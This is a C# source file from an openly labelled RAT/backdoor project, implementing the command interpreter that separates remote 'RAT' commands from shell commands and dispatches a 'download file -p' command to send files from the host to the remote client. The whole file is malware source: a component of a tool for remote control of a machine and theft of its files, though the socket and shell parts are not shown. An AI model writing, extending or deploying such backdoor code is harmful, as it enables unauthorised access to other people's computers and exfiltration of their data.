using RAT.src.Interfaces;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;

namespace RAT.src.Logic.RatCommands
{
    /// <summary>
    /// Our rat/backdoor commands handling logic.
    /// </summary>
    public class RatCommandLogic : IRatCommandLogic
    {
        private ISocketStateLogic _stateLogic;
        private IClientNotificationLogic _notificationLogic;
        private IFileDownloader _fileDownloader;

        /// <summary>
        /// Our rat/backdoor commands handling logic.
        /// </summary>
        /// <param name="stateLogic">Logic for our client state.</param>
        /// <param name="notificationLogic">Logic client notification.</param>
        /// <param name="fileDownloader">Logic for file download (to client).</param>
        public RatCommandLogic(
            ISocketStateLogic stateLogic,
            IClientNotificationLogic notificationLogic,
            IFileDownloader fileDownloader)
        {
            _stateLogic = stateLogic;
            _fileDownloader = fileDownloader;
            _notificationLogic = notificationLogic;
        }

        /// <summary>
        /// Currently available commands for our rat/backdoor.
        /// </summary>
        private List<string> _ratCommands = new List<string>()
            { "upload file -p", "download file -p" };

        /// <summary>
        /// Our command identifier, if this is found in our string command during receival as first word - then client wants
        /// to execute rat command, not shell command.
        /// </summary>
        private const string _ratCommandIdentifier = "RAT";

        /// <summary>
        /// Determines if first word of string is command for rat.
        /// </summary>
        /// <param name="command">Command from internet i.e "cd .." for shell, or "dir", whatever.</param>
        /// <returns>True if command is rat command, false is something else.</returns>
        public bool IsRatCommand(string command)
        {
            // Check if first word of string is our command identifier.
            return Regex.Replace(command.Split()[0], @"[^0-9a-zA-Z\ ]+", "") == _ratCommandIdentifier;
        }

        /// <summary>
        /// Handles rat command that clien wants to execute.
        /// </summary>
        /// <param name="command">Command to handle (such as file upload, download, etc)./param>
        public void HandleRatCommand(string command)
        {
            var clientState = _stateLogic.State;
            var formattedCommand = this.FormatCommand(command);

            // Here goes custom command interpreter, not using any libs for argument handling.
            if (!this.IsValidRatCommand(formattedCommand))
            {
                _notificationLogic.NotifyClient($"\"{formattedCommand}\" is unrecognized RAT command\n");
                return;
            }

            var words = formattedCommand.Split();
            string cleanCommand = words[1] + ' ' + words[2];
            if (cleanCommand == "download file")
            {
                int indexOfPath = formattedCommand.IndexOf(" -p ");
                if (indexOfPath == -1)
                {
                    _notificationLogic.NotifyClient($"\"-p\" (path) argument not found for RAT\n");
                    return;
                }

                _fileDownloader.DownloadFile(formattedCommand.Substring(indexOfPath + " -p ".Length).Trim());
            }
        }

        /// <summary>
        /// Formats command for interpreter.
        /// </summary>
        /// <param name="command">Command to format.</param>
        /// <returns>Formatted command.</returns>
        private string FormatCommand(string command)
        {
            // Get rid of \n in the end of command.
            return command.Substring(0, command.LastIndexOf("\n"));
        }

        /// <summary>
        /// Determines if command is valid to be executed/interpreted by program.
        /// </summary>
        /// <param name="clientCommand">Command from internet i.e "cd .." for shell, or "dir", whatever.</param>
        /// <returns>True if is valid command, false otherwise.</returns>
        private bool IsValidRatCommand(string clientCommand)
        {
            return this.IsRatCommand(clientCommand)
                && _ratCommands.Any(validCommand => clientCommand.Contains(validCommand));
        }
    }
}